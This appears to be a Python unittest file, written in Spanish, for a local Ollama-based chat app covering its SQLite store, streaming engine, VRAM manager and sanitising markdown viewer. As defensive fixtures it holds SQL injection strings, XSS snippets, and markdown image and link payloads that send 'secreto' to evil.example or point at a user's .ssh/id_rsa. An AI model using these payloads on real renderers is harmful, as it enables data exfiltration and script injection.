"""Pruebas del chat (almacén SQLite y motor) y del gestor de VRAM. No necesitan Ollama: el cliente se simula."""
import sys
import tempfile
import threading
import unittest
from pathlib import Path
from types import SimpleNamespace
from unittest import mock

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

from src.chat import engine as eng  # noqa: E402
from src.chat.store import ChatStore, title_from  # noqa: E402
from src.core import model_manager as mm  # noqa: E402
from src.core.utils import Cancelled  # noqa: E402

CFG = {"ollama": {"host": "http://localhost:11434"}}


class TestStore(unittest.TestCase):
    def setUp(self):
        self.s = ChatStore(":memory:")

    def test_crear_listar_y_mensajes_en_orden(self):
        a = self.s.create("qwen2.5:7b", "sé breve", "Primera")
        self.s.add(a, "user", "hola")
        self.s.add(a, "assistant", "¿qué tal?")
        msgs = self.s.messages(a)
        self.assertEqual([(m.role, m.content) for m in msgs], [("user", "hola"), ("assistant", "¿qué tal?")])
        self.assertEqual(self.s.get(a).system_prompt, "sé breve")

    def test_la_mas_reciente_va_primero(self):
        a = self.s.create("m", title="A")
        b = self.s.create("m", title="B")
        self.s.add(a, "user", "x")          # actualiza A, que pasa a ser la más reciente
        self.assertEqual([c.id for c in self.s.conversations()][:2], [a, b])

    def test_borrar_conversacion_borra_sus_mensajes(self):
        a = self.s.create("m")
        self.s.add(a, "user", "x")
        self.s.delete(a)
        self.assertIsNone(self.s.get(a))
        self.assertEqual(self.s.messages(a), [])

    def test_imagenes_se_guardan_como_rutas(self):
        a = self.s.create("qwen2.5vl:7b")
        self.s.add(a, "user", "mira", ["C:/x/foto.png"])
        self.assertEqual(self.s.messages(a)[0].images, ["C:/x/foto.png"])

    def test_inyeccion_sql_no_hace_nada(self):
        a = self.s.create("m", title="x'); DROP TABLE messages;--")
        self.s.add(a, "user", "'; DELETE FROM conversations;--")
        self.assertEqual(len(self.s.conversations()), 1)
        self.assertEqual(self.s.messages(a)[0].content, "'; DELETE FROM conversations;--")

    def test_rol_invalido_se_rechaza(self):
        a = self.s.create("m")
        with self.assertRaises(Exception):
            self.s.add(a, "hacker", "x")

    def test_regenerar_quita_la_ultima_respuesta(self):
        a = self.s.create("m")
        self.s.add(a, "user", "p")
        self.s.add(a, "assistant", "r1")
        self.s.drop_last(a, "assistant")
        self.assertEqual([m.role for m in self.s.messages(a)], ["user"])

    def test_exportar_a_markdown(self):
        a = self.s.create("llama3.1:8b", "Eres un tutor", "Cálculo")
        self.s.add(a, "user", "¿Qué es una integral?")
        self.s.add(a, "assistant", "$\\int_0^1 x\\,dx = \\tfrac12$")
        md = self.s.export_markdown(a)
        self.assertTrue(md.startswith("# Cálculo"))
        self.assertIn("**System prompt:** Eres un tutor", md)
        self.assertIn("## Tú\n\n¿Qué es una integral?", md)
        self.assertIn("## Asistente\n\n$\\int_0^1 x\\,dx = \\tfrac12$", md)

    def test_persistencia_en_disco(self):
        with tempfile.TemporaryDirectory() as d:
            p = Path(d) / "sub" / "chat.db"
            s1 = ChatStore(p)
            a = s1.create("m", title="Guardada")
            s1.add(a, "user", "hola")
            s1.close()
            s2 = ChatStore(p)
            self.assertEqual(s2.conversations()[0].title, "Guardada")
            self.assertEqual(s2.messages(a)[0].content, "hola")
            s2.close()

    def test_titulo(self):
        self.assertEqual(title_from("  hola   mundo "), "hola mundo")
        self.assertEqual(len(title_from("x" * 200)), 48)
        self.assertEqual(title_from("   "), "Nueva conversación")


class TestEngine(unittest.TestCase):
    def test_modelos_de_vision(self):
        self.assertTrue(eng.is_vision("qwen2.5vl:7b"))
        self.assertTrue(eng.is_vision("llava:13b"))
        self.assertFalse(eng.is_vision("qwen2.5:7b"))
        self.assertFalse(eng.is_vision("qwen2.5-coder:7b"))

    def test_opciones_a_ollama(self):
        o = eng.Params(temperature=0.2, top_p=0.5, max_tokens=300, num_ctx=4096).options()
        self.assertEqual(o, {"temperature": 0.2, "top_p": 0.5, "num_predict": 300, "num_ctx": 4096})

    def test_mensajes_con_system_historial_e_imagenes(self):
        with tempfile.TemporaryDirectory() as d:
            img = Path(d) / "a.png"
            img.write_bytes(b"\x89PNGfake")
            hist = [SimpleNamespace(role="user", content="hola", images=[]),
                    SimpleNamespace(role="assistant", content="buenas", images=[])]
            msgs = eng.build_messages("Sé breve", hist, "¿qué ves?", [str(img)], vision=True)
            self.assertEqual([m["role"] for m in msgs], ["system", "user", "assistant", "user"])
            self.assertEqual(msgs[-1]["images"], [b"\x89PNGfake"])
            sin = eng.build_messages("", hist, "x", [str(img)], vision=False)
            self.assertNotIn("images", sin[-1])
            self.assertEqual(sin[0]["role"], "user")      # sin system prompt no se inventa uno

    def test_recorta_el_historial_antiguo_sin_perder_system_ni_ultimo(self):
        msgs = [{"role": "system", "content": "S"}] + \
               [{"role": "user" if i % 2 == 0 else "assistant", "content": "palabra " * 400} for i in range(10)]
        out = eng.trim_history(msgs, num_ctx=2048, reserve=256)
        self.assertEqual(out[0]["role"], "system")
        self.assertEqual(out[-1], msgs[-1])
        self.assertLess(len(out), len(msgs))

    def _fake_client(self, parts):
        client = mock.Mock()
        client.chat.return_value = iter(parts)
        return client

    def _part(self, text, done=False, **kw):
        return SimpleNamespace(message=SimpleNamespace(content=text), done=done, **kw)

    def test_streaming_acumula_texto_y_calcula_velocidad(self):
        parts = [self._part("Ho"), self._part("la"), self._part("", done=True, eval_count=50, eval_duration=int(2e9),
                                                              prompt_eval_count=12)]
        seen = []
        with mock.patch.object(eng, "get_client", return_value=self._fake_client(parts)):
            r = eng.ChatEngine(CFG).stream("qwen2.5:7b", [{"role": "user", "content": "x"}], eng.Params(),
                                           on_text=seen.append)
        self.assertEqual(r.text, "Hola")
        self.assertEqual(r.tokens, 50)
        self.assertAlmostEqual(r.tokens_per_s, 25.0)
        self.assertEqual(r.prompt_tokens, 12)
        self.assertEqual(seen[-1], "Hola")

    def test_cancelar_corta_el_streaming(self):
        cancel = threading.Event()
        cancel.set()
        with mock.patch.object(eng, "get_client", return_value=self._fake_client([self._part("a"), self._part("b")])):
            with self.assertRaises(Cancelled):
                eng.ChatEngine(CFG).stream("m", [{"role": "user", "content": "x"}], eng.Params(), cancel=cancel)


class TestGestorVRAM(unittest.TestCase):
    def _manager(self, running):
        client = mock.Mock()
        client.ps.return_value = SimpleNamespace(models=[SimpleNamespace(model=m) for m in running])
        patcher = mock.patch.object(mm, "get_client", return_value=client)
        patcher.start()
        self.addCleanup(patcher.stop)
        return mm.ModelManager(CFG), client

    def test_antes_de_imagenes_se_descargan_los_llm(self):
        m, client = self._manager(["qwen2.5:7b", "qwen2.5vl:7b"])
        m.use_images("sd15")
        descargados = [c.kwargs["model"] for c in client.generate.call_args_list]
        self.assertEqual(descargados, ["qwen2.5:7b", "qwen2.5vl:7b"])
        for c in client.generate.call_args_list:
            self.assertEqual(c.kwargs["keep_alive"], 0)
        self.assertEqual(m.state, "imagen: sd15")

    def test_antes_del_chat_se_libera_el_pipeline_de_imagenes(self):
        m, client = self._manager([])
        liberado = []
        m.register_image_unloader(lambda: liberado.append(True))
        m.use_images("sd15")
        m.use_llm("qwen2.5:7b")
        self.assertEqual(liberado, [True])
        self.assertEqual(m.state, "chat: qwen2.5:7b")

    def test_no_libera_imagenes_si_ya_estaba_en_chat(self):
        m, _ = self._manager([])
        liberado = []
        m.register_image_unloader(lambda: liberado.append(True))
        m.use_llm("a")
        m.use_llm("b")
        self.assertEqual(liberado, [])

    def test_los_oyentes_ven_cada_cambio_de_estado(self):
        m, _ = self._manager(["x"])
        estados = []
        m.listeners.append(estados.append)
        m.use_images("sd15")
        self.assertIn("imagen: sd15", estados)
        self.assertTrue(any("descargando" in e for e in estados))

    def test_error_al_descargar_un_modelo_no_rompe_el_cambio(self):
        m, client = self._manager(["x"])
        client.generate.side_effect = RuntimeError("ollama caído")
        m.use_images("sd15")
        self.assertEqual(m.state, "imagen: sd15")


class TestVisorSeguro(unittest.TestCase):
    """La salida de un modelo no es de fiar: no puede cargar nada de fuera ni ejecutar HTML."""

    def html(self, md):
        from src.core.mdview import md_to_html
        return md_to_html(md, "light", "Segoe UI", formulas=False, safe=True)[0]

    def test_imagen_externa_bloqueada(self):
        h = self.html("![x](http://evil.example/?q=secreto)")
        self.assertNotIn("evil.example", h)
        self.assertIn("imagen externa bloqueada", h)

    def test_imagen_externa_con_https_y_ruta_local_bloqueadas(self):
        for url in ("https://evil.example/a.png", "file:///C:/Users/alguien/.ssh/id_rsa", "//evil.example/x.png"):
            h = self.html(f"![]({url})")
            self.assertNotIn("<img", h, url)       # nada que el visor pueda cargar
            self.assertNotIn("src=", h, url)

    def test_enlaces_sin_href(self):
        h = self.html("[pulsa aquí](http://evil.example/robo)")
        self.assertNotIn("href", h)
        self.assertNotIn("evil.example", h)
        self.assertIn("pulsa aquí", h)

    def test_html_crudo_se_escapa(self):
        h = self.html("hola <script>alert(1)</script> <img src=http://evil.example/x.png onerror=x>")
        self.assertNotIn("<script", h)
        self.assertNotIn("<img", h)

    def test_formulas_siguen_funcionando_como_imagen_embebida(self):
        from src.core.mdview import md_to_html
        h = md_to_html("Vale $x^2$", "light", "Segoe UI", formulas=True, safe=True)[0]
        self.assertIn("data:image/png;base64", h)

    def test_el_modo_normal_no_cambia(self):
        from src.core.mdview import md_to_html
        h = md_to_html("[a](http://x.example)", "light", "Segoe UI", formulas=False)[0]
        self.assertIn("href", h)


class TestPreferenciasYRender(unittest.TestCase):
    def test_preferencias_validan_tipos_y_rangos(self):
        import json
        from src.chat.store import DEFAULT_PREFS, load_prefs, save_prefs
        with tempfile.TemporaryDirectory() as d:
            p = Path(d) / "prefs.json"
            self.assertEqual(load_prefs(p), DEFAULT_PREFS)                       # no existe: valores por defecto
            p.write_text(json.dumps({"temperature": 9, "top_p": 0.3, "max_tokens": "mucho", "num_ctx": 4096,
                                     "model": "llama3.1:8b", "system_prompt": "   "}))
            got = load_prefs(p)
            self.assertEqual(got["temperature"], DEFAULT_PREFS["temperature"])   # fuera de rango
            self.assertEqual(got["top_p"], 0.3)
            self.assertEqual(got["max_tokens"], DEFAULT_PREFS["max_tokens"])     # tipo erróneo
            self.assertEqual(got["num_ctx"], 4096)
            self.assertEqual(got["model"], "llama3.1:8b")
            self.assertEqual(got["system_prompt"], DEFAULT_PREFS["system_prompt"])  # vacío
            p.write_text("[1, 2]")
            self.assertEqual(load_prefs(p), DEFAULT_PREFS)
            p.write_text("no es json")
            self.assertEqual(load_prefs(p), DEFAULT_PREFS)
            save_prefs({**DEFAULT_PREFS, "temperature": 1.2}, p)
            self.assertEqual(load_prefs(p)["temperature"], 1.2)

    def test_html_de_la_conversacion(self):
        from src.chat import render
        msgs = [SimpleNamespace(role="user", content="Hola **mundo**", images=[]),
                SimpleNamespace(role="assistant", content="Fórmula $x^2$", images=[]),
                SimpleNamespace(role="system", content="secreto", images=[])]
        h = render.conversation_html(msgs, "light", "Segoe UI", formulas=False)
        self.assertIn("<strong>mundo</strong>", h)
        self.assertIn("Tú", h)
        self.assertIn("Asistente", h)
        self.assertNotIn("secreto", h)                  # el system prompt no se muestra como mensaje

    def test_html_escapa_el_nombre_de_las_imagenes(self):
        from src.chat import render
        h = render.message_html("user", "mira", "light", "Segoe UI", formulas=False, images=("C:/x/<b>.png",))
        self.assertNotIn("<b>.png", h)
        self.assertIn("&lt;b&gt;.png", h)

    def test_el_mensaje_en_vivo_lleva_id_para_actualizarlo(self):
        from src.chat import render
        self.assertIn("id='live'", render.message_html("assistant", "...", "dark", "Segoe UI", formulas=False, element_id="live"))

    def test_esqueleto_contiene_el_contenedor(self):
        from src.chat import render
        self.assertIn("id='msgs'", render.skeleton("dark", "Segoe UI"))
        self.assertIn("Todo se queda en tu equipo", render.empty_html("light", "Segoe UI"))


class TestDescargaDeModelos(unittest.TestCase):
    def test_pull_informa_del_progreso(self):
        partes = [SimpleNamespace(status="pulling manifest", total=None, completed=None),
                  SimpleNamespace(status="pulling abc", total=200, completed=50),
                  SimpleNamespace(status="success", total=None, completed=None)]
        client = mock.Mock()
        client.pull.return_value = iter(partes)
        visto = []
        with mock.patch.object(eng, "get_client", return_value=client):
            eng.ChatEngine(CFG).pull("llama3.1:8b", lambda f, s: visto.append((f, s)))
        self.assertEqual(visto[1], (0.25, "pulling abc"))
        self.assertEqual(visto[-1][1], "success")
        client.pull.assert_called_once_with("llama3.1:8b", stream=True)

    def test_pull_se_puede_cancelar(self):
        cancel = threading.Event()
        cancel.set()
        client = mock.Mock()
        client.pull.return_value = iter([SimpleNamespace(status="x", total=1, completed=0)])
        with mock.patch.object(eng, "get_client", return_value=client):
            with self.assertRaises(Cancelled):
                eng.ChatEngine(CFG).pull("llama3.1:8b", cancel=cancel)


if __name__ == "__main__":
    unittest.main()
